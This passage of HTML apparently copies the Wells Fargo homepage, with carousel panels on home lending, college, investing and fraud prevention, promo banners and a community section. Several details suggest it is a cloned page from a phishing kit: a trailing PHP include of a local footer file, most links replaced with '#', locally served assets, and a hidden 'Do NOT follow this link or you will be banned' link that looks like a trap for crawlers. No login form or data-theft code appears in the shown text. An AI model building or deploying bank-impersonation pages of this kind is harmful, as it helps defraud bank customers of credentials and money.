<div class="nbaImg12"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Refinance your mortgage &gt;</a></span></div>
</li>
</ul>
        
            <p>
		<a class="c7" role="button" href="#">Go to Home Lending</a>
	</p>
        </div>
    </div>
<span class="hidden">End item 4</span></div>
          
         
              
            <div class="carouselFrame item5" role="tabpanel" data-ia-code="C_efs_college_hpcarousel_web" data-cid="tcm:84-146942-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels5" aria-labelledby="nbaDefault5" tabindex="0" style="display: none;"><span class="hidden">Begin item 5</span>
    <div class="c63contentMain">
    
        <img alt="" src="#">
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Planning and paying for college</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg13"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Learn about financial aid &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg14"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Explore private student loans &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg15"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Manage your money while in school &gt;</a></span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button" href="#">Visit Going to College</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 5</span></div>
          
         
              
            <div class="carouselFrame item6" role="tabpanel" data-ia-code="C_wtr_investment_hpcarousel_web" data-cid="tcm:84-147005-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels6" aria-labelledby="nbaDefault6" tabindex="0" style="display: none;"><span class="hidden">Begin item 6</span>
    <div class="c63contentMain">
    
        <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/photography/lifestyle/970x485/woman-tablet-investing-basics-970x485.jpg">
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Pursue your investing goals</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg16"><a aria-hidden="true" tabindex="-1" href="/goals-investing/investing-types/?linkLoc=nba"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="/goals-investing/investing-types/?linkLoc=nba">Understand investment types &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg17"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Compare ways to invest &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg18"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="/goals-investing/saving-vs-investing/?linkLoc=nba">To save or to invest? &gt;</a></span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button" href="/goals-investing/?linkLoc=nba">Go to Investing Basics</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 6</span></div>
          
         
              
            <div class="carouselFrame item7" role="tabpanel" data-ia-code="C_oth_fraud_hpcarousel_web" data-cid="tcm:84-147034-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels7" aria-labelledby="nbaDefault7" tabindex="0" style="display: none;"><span class="hidden">Begin item 7</span>
    <div class="c63contentMain">
    
        <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/photography/lifestyle/970x485/woman-card-security-center-970x485.jpg">
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Take action to help safeguard your accounts</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg22"><a aria-hidden="true" tabindex="-1" href="/privacy-security/fraud/report/?linkLoc=nba"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Report fraud and suspicious activity &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg23"><a aria-hidden="true" tabindex="-1" href="/#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Change your username and password often &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg24"><a aria-hidden="true" tabindex="-1" href="/privacy-security/fraud/bank-scams/?linkLoc=nba"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Recognize common scams &gt;</a></span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button" href="#">Learn More About Fraud Prevention</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 7</span></div>
          
         
    </div>
<div class="carouselFrame incomingFrame" style="display: none;"></div></div>




   
    
<div class="largePromo fadeInElement" data-cid="tcm:242-147041-16" data-ctid="tcm:224-146926-32" style="opacity: 1;">	
    
<div class="cmsDefault" data-slot-id="WF_CON_HP_PROD_SVC_BNR" lang="en">
	
            <div class="inner" data-cid="tcm:84-146982-16" data-ctid="tcm:91-146914-32">
    
      <div class="col1">
            
                <a class="i7" href="/savings-cds/" tabindex="-1" aria-hidden="true">
                     <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/homepage/wfic638_ph_b-jk_0224_4057_489x234.jpg">
                </a>
            
           
      </div>
    
    <div class="col2">
        <h3>Make saving a habit</h3>
        <span>Reach your financial goals with a savings account</span>
        
          <a class="c7" role="button" href="/savings-cds/">Start Now</a>
        
    </div>
</div>
          
</div>
    				
</div>

 <div class="recommendedTitleWrapper fadeInElement" data-cid="tcm:182-147037-16" data-ctid="tcm:223-146919-32" style="opacity: 1;">

  <h3 class="recommendedTitle">Suggested for you</h3> 

</div>

<div class="hpAdditional fadeInElement" data-cid="tcm:242-147042-16" data-ctid="tcm:224-146928-32" style="opacity: 1;">
	<div class="hpAdditionalMainCol">
		
			<div class="cmsDefault" data-slot-id="WF_CON_HP_SECONDARY_BNR_1" lang="en">
               
            <div class="hpAdditionalContentImg fadeMe" data-cid="tcm:84-146991-16" data-ctid="tcm:91-146900-32">
         <div class="wrapper" style="display: block;">
             
               
                 <a class="i7" href="#">
           
                            
          <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/homepage/wfi111_ph_hre_default1_304x194.jpg" class="deferred" data-deferred-src="https://www01.wellsfargomedia.com/./assets/images/homepage/wfi111_ph_hre_default1_304x194.jpg">
        
                            <span class="hpAdditionalContentCol">                                
			    <span class="c5headline">Review your FICO<sup>®</sup> Credit Score</span>
                            <span class="hpAdditionalContentText">For eligible Wells Fargo customers</span>
                            </span>
                 </a>
            </div>
</div>
          
			</div>
		
			<div class="cmsDefault" data-slot-id="WF_CON_HP_SECONDARY_BNR_2" lang="en">
               
            <div class="hpAdditionalContentImg fadeMe" data-cid="tcm:84-147019-16" data-ctid="tcm:91-146900-32">
         <div class="wrapper" style="display: block;">
             
               
                 <a class="i7" href="/goals-credit/large-expenses/my-credit-options-guide/">
           
                            
          <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/homepage/wfi111_ph_hre_default2_304x194.jpg" class="deferred" data-deferred-src="https://www01.wellsfargomedia.com/./assets/images/homepage/wfi111_ph_hre_default2_304x194.jpg">
        
                            <span class="hpAdditionalContentCol">                                
			    <span class="c5headline">Learn about your credit options</span>
                            <span class="hpAdditionalContentText">Let’s talk about your personalized <em>My Credit Options Guide</em><sup>®</sup></span>
                            </span>
                 </a>
            </div>
</div>
          
			</div>
		
			<div class="cmsDefault" data-slot-id="WF_CON_HP_SECONDARY_BNR_3" lang="en">
               
            <div class="hpAdditionalContentImg fadeMe" data-cid="tcm:84-146971-16" data-ctid="tcm:91-146900-32">
         <div class="wrapper" style="display: block;">
             
               
                 <a class="i7" href="#">
           
                            
         
        
                            <span class="hpAdditionalContentCol">                                
			    <span class="c5headline">Questions about an old 401(k)?</span>
                            <span class="hpAdditionalContentText">Let’s talk about your options</span>
                            </span>
                 </a>
            </div>
</div>
          
			</div>
		
	</div>         		
</div>



<!-- Bottom Region Starts-->
<div class="bottomRegion fadeInElement" style="opacity: 1;">
	
       
        

        
 
<a rel="nofollow" style="display:none;" href="assets">Do NOT follow this link or you will be banned from the site!</a>

                            		<div class="inner">
<div class="col1">
<h2>Serving our customers and communities</h2>
<p>It doesn't happen with one transaction, in one day on the job or in one quarter. It's earned relationship by relationship.</p>
<ul id="communityLinks">
<li>
						<a href="#">
							<span class="communityLinkImg">
								<img alt="" src="./assets/images/home-sprite-image.png">
							</span>
							 Our Vision, Values &amp; Goals
						</a>
					</li>
<li>
						<a href="#">
							<span class="communityLinkImg">
								<img alt="" src="./assets/images/home-sprite-image.png">
							</span>
							 Making Things Right – Customer Redress
						</a>
					</li>
<li>
						<a href="#">
							<span class="communityLinkImg">
								<img alt="" src="./assets/images/home-sprite-image.png">
							</span>
							 Corporate Social Responsibility
						</a>
					</li>
<li>
						<a href="#">
							<span class="communityLinkImg">
								<img alt="" src="./assets/images/home-sprite-image.png">
							</span>
							 Wells Fargo Stories
						</a>
					</li>
</ul>
</div>
<div class="box">
				<img alt="" class="deferred" src="https://www01.wellsfargomedia.com/./assets/images/photography/lifestyle/wells-fargo-volunteer-gardening_414x240.jpg" data-deferred-src="https://www01.wellsfargomedia.com/./assets/images/photography/lifestyle/wells-fargo-volunteer-gardening_414x240.jpg">
				 
				<img alt="" class="deferred hide" src="https://www04.wellsfargomedia.com/./assets/images/homepage/stagecoach-two-drivers-field-green-414x240.jpg" data-deferred-src="https://www04.wellsfargomedia.com/./assets/images/homepage/stagecoach-two-drivers-field-green-414x240.jpg">
				 
				<img alt="" class="deferred hide" src="https://www01.wellsfargomedia.com/./assets/images/homepage/redress_414x240.jpg" data-deferred-src="https://www01.wellsfargomedia.com/./assets/images/homepage/redress_414x240.jpg">
				 
				<img alt="" class="deferred hide" src="https://www04.wellsfargomedia.com/./assets/images/homepage/three-men-volunteer-house-414x240.jpg" data-deferred-src="https://www04.wellsfargomedia.com/./assets/images/homepage/three-men-volunteer-house-414x240.jpg">
				 
				<img alt="" class="deferred hide" src="https://www01.wellsfargomedia.com/./assets/images/homepage/woman-sitting-chair-tablet-screenshot-414x240.jpg" data-deferred-src="https://www01.wellsfargomedia.com/./assets/images/homepage/woman-sitting-chair-tablet-screenshot-414x240.jpg">
			</div>
</div>
	                        


        
        

                
	
</div>
<!-- Bottom Region Ends-->


       


        </div>
        
         
<?php 
include ("page/footer.php");
?>

